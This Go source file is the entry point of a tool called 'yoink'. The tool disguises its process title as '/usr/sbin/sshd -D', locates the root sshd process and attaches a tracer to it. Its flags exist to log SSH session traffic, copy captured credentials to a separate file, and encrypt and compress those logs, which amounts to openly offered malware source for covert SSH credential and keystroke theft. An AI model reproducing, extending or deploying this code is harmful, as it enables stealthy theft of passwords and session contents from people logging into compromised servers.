package main

import (
	"flag"
	"github.com/lunixbochs/gspt"
	"io"
	"log"
	"os"

	"./ghostrace/ghost/process"
)

func main() {
	fs := flag.NewFlagSet("yoink", flag.ExitOnError)
	title := fs.String("title", "/usr/sbin/sshd -D", "set process title")
	nullIO := fs.Bool("noio", false, "skip logging IO, still can log creds")
	logPath := fs.String("o", "", "set output log (disables stdout, will logrotate on startup: TREAD CAREFULLY)")
	credLog := fs.String("creds", "", "copy creds to separate log (O_APPEND and can encrypt with -encrypt. no compression or logrotate)")
	key := fs.String("encrypt", "", "encrypt logs with key (must be 32 hex bytes)")
	lzw := fs.Bool("lzw", false, "compress logs")
	pid := fs.Int("sshd", 0, "force root sshd pid")
	fs.Parse(os.Args[1:])
	log.SetFlags(0)

	// this changes our title in `ps`
	gspt.SetProcTitle(*title)

	// set up logging
	var output io.WriteCloser = os.Stderr
	var credOut io.WriteCloser = &Discard{}
	var err error
	if *nullIO {
		output = &Discard{}
	}
	if *logPath != "" {
		output, err = openLog(*logPath)
		if err != nil {
			log.Fatalf("[-] failed to open log %#v: %s", *logPath, err)
		}
	}
	if *credLog != "" {
		credOut, err = os.OpenFile(*credLog, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
		if err != nil {
			log.Fatalf("[-] failed to open cred log %#v: %s", *credLog, err)
		}
	}
	if *lzw {
		if *logPath == "" {
			log.Println("[-] warning: -lzw requires -o")
		} else {
			output = compressStream(output)
		}
	}
	if *key != "" {
		if *logPath == "" {
			log.Println("[-] warning: -encrypt requires -o")
		} else {
			output, err = encryptStream(output, *key)
			if err != nil {
				log.Fatalf("[-] encryption init failed: %s", err)
			}
			if credOut != nil {
				credOut, err = encryptStream(credOut, *key)
				if err != nil {
					log.Fatalf("[-] encryption init failed (-creds): %s", err)
				}
			}
		}
	}
	logger := log.New(output, "", 0)
	credLogger := log.New(credOut, "", log.LstdFlags)

	// find sshd
	sshd := 0
	if *pid > 0 {
		sshd = *pid
	} else {
		parentSshd, err := process.Filter(func(p process.Process) bool {
			if isSshd(p) {
				return isSshd(p) && !isSshd(p.Parent())
			}
			return false
		})
		if err != nil {
			log.Fatalf("[-] error searching for sshd: %s", err)
		}
		if len(parentSshd) != 1 {
			log.Fatalf("[-] need (1) root sshd, found (%d)", len(parentSshd))
		}
		sshd = parentSshd[0].Pid()
	}
	if *logPath != "" {
		log.Printf("[+] started with pid [%d]", os.Getpid())
	}
	logger.Printf("[+] started with pid [%d]", os.Getpid())
	logger.Printf("[+] attaching to root sshd at [%d]", sshd)
	if err := trace(sshd, logger, credLogger); err != nil {
		logger.Printf("[-] error during trace: %s", err)
	}
	output.Close()
}
